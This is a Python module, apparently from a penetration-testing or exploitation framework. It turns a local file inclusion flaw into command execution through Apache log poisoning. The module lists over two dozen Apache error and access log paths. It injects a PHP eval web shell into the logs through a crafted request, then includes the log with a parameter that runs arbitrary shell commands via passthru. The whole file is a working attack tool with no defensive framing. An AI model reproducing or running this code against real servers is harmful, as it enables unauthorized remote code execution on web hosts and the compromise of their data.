import requests
# for url encoding
import urllib

# technique
from core.techniques.LFIExec import LFIExec

class LFIApacheLog (LFIExec):
    files_exec = [
        # apache error logs
        { 'path' : '/var/log/apache2/error_log', 'type' : 'log' },
        { 'path' : '/var/log/apache2/error.log', 'type' : 'log' },
        { 'path' : '/var/log/apache/error_log', 'type' : 'log' },
        { 'path' : '/var/log/apache/error.log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/error_log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/error.log', 'type' : 'log' },
        { 'path' : '/var/log/error_log', 'type' : 'log' },
        { 'path' : '/var/log/error.log ', 'type' : 'log' },
        { 'path' : '/var/www/logs/error_log', 'type' : 'log' },
        { 'path' : '/var/www/logs/error.log', 'type' : 'log' },
        { 'path' : '/apache/logs/error.log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/error_log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/error.log', 'type' : 'log' },
        # access error logs
        { 'path' : '/var/log/apache2/access_log', 'type' : 'log' },
        { 'path' : '/var/log/apache2/access.log', 'type' : 'log' },
        { 'path' : '/var/log/apache/access_log', 'type' : 'log' },
        { 'path' : '/var/log/apache/access.log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/acces_log', 'type' : 'log' },
        { 'path' : '/etc/httpd/logs/acces.log', 'type' : 'log' },
        { 'path' : '/var/log/access_log', 'type' : 'log' },
        { 'path' : '/var/log/access.log', 'type' : 'log' },
        { 'path' : '/var/www/logs/access_log', 'type' : 'log' },
        { 'path' : '/var/www/logs/access.log', 'type' : 'log' },
        { 'path' : '/apache/logs/access.log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/access_log', 'type' : 'log' },
        { 'path' : '/usr/local/apache/logs/access.log', 'type' : 'log' }
    ]

    def __init__ (self, lfi):
        return super (LFIApacheLog, self).__init__(lfi)

    # find LFI code execution path
    # TODO : user-agent
    def check (self):
        return super (LFIApacheLog, self)._check (prepare_check_log)

    # do exec
    # TODO : randomize user-agent
    def exploit (self, cmd):
        return super (LFIApacheLog, self)._exploit (prepare_exec_log, cmd)

def prepare_check_log (lfi, payload):
    # param
    url = lfi.base_url + urllib.quote (payload)
    req = requests.get (url, headers=lfi.headers, cookies=lfi.cookies)
    return lfi.pattern_url[:]

def prepare_exec_log (lfi, cmd):
    purl = lfi.pattern_url[:]
    payload_exec = '<?php eval ($_GET["p"]); ?>'
    url = lfi.base_url + urllib.quote (payload_exec)
    req = requests.get (url, headers=lfi.headers, cookies=lfi.cookies)
    payload = '&p=echo "' + lfi.tag_start_exec + '"; passthru ("{0}"); echo "' + lfi.tag_end_exec + '"; '
    payload = payload.format (cmd)
    purl += payload
    return purl

